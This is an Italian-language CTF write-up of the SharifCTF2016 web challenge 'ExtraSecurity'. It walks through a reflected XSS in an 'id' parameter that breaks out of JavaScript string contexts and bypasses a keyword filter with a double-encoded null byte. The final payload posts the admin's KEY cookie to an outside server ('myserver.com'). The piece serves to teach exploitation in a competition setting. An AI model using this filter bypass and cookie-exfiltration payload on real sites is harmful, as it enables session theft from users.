---
layout: post
title:  "SharifCTF2016 - ExtraSecurity"
date:   2016-12-19 15:30
categories: [SharifCTF2016]
tags: [Web]
author: jbz
---


Questa sfida web richiedeva di fare 'firmare' all'utente amministratore del sito un numero.  

veniva offerta la possibilità di firmare con la propria chiave (impostata dal server in un cookie `KEY`) o di richiedere all'amministratore attraverso un form di effettuare la firma per noi. Dal testo non era chiaro quale fosse esattamente la strada da prendere: se fosse necessario rubare il cookie all'admin o se bastasse effettivamente utilizzare il form con qualche modifica.
Il testo specificava esplicitamente che l'admin avrebbe utilizzato Chrome per vedere le richieste e che quindi sarebbe intervenuto l'XSS Auditor.

Il primo problema consisteva nel fatto che nella propria pagina per effettuare la firma, all'invio del form, veniva visualizzato un popup di errore e si veniva reindirizzati prima di qualsiasi altra azione.

![Il popup di errore prima del reindirizzamento](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/ExtraSecurity/sharif_web_4.png)

`http://ctf.sharif.edu:8083/wait_and_real_sign.php?content=259&id=<team_id>`

Dal sorgente pagina si poteva notare questo codice:

```html
<script>
    alert("Sorry, server is busy for a while!");
    document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0l4eEkud0pZRGN2QWdSMG03aGUxT0VmNEZiNHZjQThZ";
</script>
```
Che è quello che causava la reindirizzazione.

Più in basso si notava anche il seguente codice, che però non veniva eseguito:

```html
<script>
    var timeElem = document.getElementById('time');
    waitSeconds(timeElem, function () {
        var c = parse(document.cookie || '');
        var key = c['KEY'];
        var body = {
            //content: base64Decode("MjU5"),
            content: "MjU5",
            key: key,
            id: 'eyJ0ZWFtaWQiOiIyNzkifS4xY0l4eEkud0pZRGN2QWdSMG03aGUxT0VmNEZiNHZjQThZ'
        };
        postForm('/sign_and_store.php', body);
    });
</script>
```

Con qualche test breve si intuiva subito che il campo GET `id` era plausibilmente vulnerabile ad XSS ma che un filtro custom bloccava le richieste contenenti la maggior parte delle keyword o simboli usati per tale scopo: eval, alert, document, this, etc. C'era inoltre un limite di caratteri che rendeva impossibile l'utilizzo di [jsfuck](http://www.jsfuck.com).

La nostra idea era quella di sfruttare la vulnerabilità nel campo `id`, il cui contenuto veniva riflesso sia nel primo script che nel secondo per rubare il cookie `KEY` all'admin ed effettuare la firma in autonomia.

Cerchiamo quindi un payload che fermi l'esecuzione del primo script e che ci permetta invece di modificare l'url di destinazione in postForm nel secondo, il tutto senza venire bloccati dal filtro di Chrome.

Il primo step è trovare un modo per rompere il primo script ma non il secondo, e questo è possibile grazie alla scelta degli organizzatori di usare apici doppi (") nel primo e apici singoli (') nel secondo:

`http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>};prompt(c['KEY']);a={'p%27:'"&content=1`

Questo payload contiene un apice doppio alla fine che rompe la sintassi del primo script, mentre chiude con un apice semplice il campo id nel secondo script, aggiunge `prompt(c['KEY'])` (equivalente di `alert(c['KEY']` ma non filtrato), e crea un nuovo dict per completare la sintassi già esistente.

Risulta quindi

```html
<script>
    alert("Sorry, server is busy for a while!");
    document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};prompt(c['KEY']);a={'p':'"";
</script>
<script>
    var timeElem = document.getElementById('time');
    waitSeconds(timeElem, function () {
        var c = parse(document.cookie || '');
        var key = c['KEY'];
        var body = {
            //content: base64Decode("MQ=="),
            content: "MQ==",
            key: key,
            id: 'eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};prompt(c['KEY']);a={'p':'"'
        };
        postForm('/sign_and_store.php', body);
    });
</script>

```

![PoC](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/ExtraSecurity/sharif_web_2.png)

Ora il grosso problema era il fatto che anche qualsiasi declinazione della parola `post`, `xml` o simili faceva scattare il filtro.
Dopo diversi tentativi, avendo intuito che il filtro fosse realizzato applicativamente (e che quindi non ci fosse un WAF vero e proprio), ed essendo l'applicazione in PHP, iniziammo a provare inserendo null bytes (%00) e altri caratteri come %0a e %0d.
Una volta scoperto che effettivamente il filtro falliva a processare qualsiasi cosa posta dopo un null byte, continuando i test notammo che il bypass funzionava anche effettuando il double encode di %00, cioè %2500 il che preveniva che il null byte venisse stampato nella pagina, che per qualche motivo causava qualche problema nell'esecuzione dello script (al momento del writeup non riesco a riprodurre il problema..).

Il payload finale quindi consisteva in:

`http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=<team_id>'};%0a/*%2500*/%0apostForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"&content=1`

Che risulta nel seguente codice:

```html
<script>
    alert("Sorry, server is busy for a while!");
    document.location = "/index.php?id=eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};
/*%00*/
postForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"";
</script>
<script>
    var timeElem = document.getElementById('time');
    waitSeconds(timeElem, function () {
        var c = parse(document.cookie || '');
        var key = c['KEY'];
        var body = {
            //content: base64Decode("MQ=="),
            content: "MQ==",
            key: key,
            id: 'eyJ0ZWFtaWQiOiIyNzkifS4xY0lybkIuelEtUy1QeFJ4WG9iV2U5NDZpOC1BQnY1Wkx3'};
/*%00*/
postForm('http://myserver.com/', body);});garbage(x, function () {a={'p':'"'
        };
        postForm('/sign_and_store.php', body);
    });
</script>

```

![Gli errori nella console dimostrano la mancata esecuzione del primo script e la corretta sintassi del secondo](https://raw.githubusercontent.com/jbzteam/CTF/master/SharifCTF2016/ExtraSecurity/sharif_web_3.png)

Da `garbage` in poi il codice serviva solo per non causare errori di sintassi.
Da notare che il filtro XSS di Chrome in questo scenario non si è mai considerato in quanto la XSS non richiede tag HTML poiché il payload finisce già all'interno di tag `<script>`.

La richiesta di firma all'admin inviava una POST che conteneva un campo URL che lasciava intendere che fosse quello che l'admin avrebbe visitato per effettuare la firma. Bisognava quindi modificare quel campo con il payload descritto sopra.

Purtroppo non siamo riusciti a risolverla in tempo per ottenere il punteggio.
